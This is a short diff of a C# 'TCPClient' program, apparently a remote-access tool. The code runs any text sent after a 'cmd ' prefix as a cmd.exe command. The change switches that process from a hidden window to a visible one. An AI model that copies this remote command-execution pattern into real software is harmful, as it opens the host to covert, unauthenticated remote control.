@@ -105,7 +105,7 @@ namespace TCPClient
                     string command = message.Replace("cmd ", string.Empty);
                     Process process = new Process();
                     ProcessStartInfo startInfo = new ProcessStartInfo();
-                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    startInfo.WindowStyle = ProcessWindowStyle.Normal;
                     startInfo.FileName = "cmd.exe";
                     startInfo.Arguments = command;
                     process.StartInfo = startInfo;
